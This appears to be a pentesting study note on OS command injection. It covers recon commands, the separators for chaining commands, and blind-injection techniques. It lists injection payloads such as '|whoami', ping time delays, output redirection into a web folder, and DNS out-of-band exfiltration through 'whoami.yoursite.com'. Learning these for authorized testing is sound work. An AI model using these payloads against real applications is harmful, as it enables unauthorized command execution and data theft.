### OS command injection

**Useful commands**

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |



#### How to Test this Vulnerability

- **Simple case**

  try to add `|whoami` to the end of parameters go to DB and observe the response

  *this case work when website append no defense against this type of attacks*

- **Blind OS command injection vulnerabilities**

  he application does not return the output from the command within its HTTP response.

  Consider a web site that lets users **submit feedback** about the site.

  **How to detect :**

  - **Detecting blind OS command injection using time delays**

    add `||ping -c 10 127.0.0.1||`  if delay executed this parameter vulnerable 

  - **Exploiting blind OS command injection by redirecting output**

    add `||whoami > /var/www/static/whoami.txt||` then search for function which retrieve data from this folder alter the request to `whoami.txt` 

  - **Exploiting blind OS command injection using out-of-band (OAST) techniques**

    add `|| nslookup yoursite.com ||`  then check your logs or use burp collab URL

    add *||nslookup+whoami.yoursite.com||*  then check your logs or use burp collab URL



#### Ways of injecting OS commands

A variety of shell metacharacters can be used to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

- &
- &&
- |
- ||

The following command separators work only on Unix-based systems:

- ;
- Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

```
`injected command `
$( injected command )
```



Note :

that the different shell metacharacters have subtly different behaviors that might affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful only for blind exploitation.

*Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.*

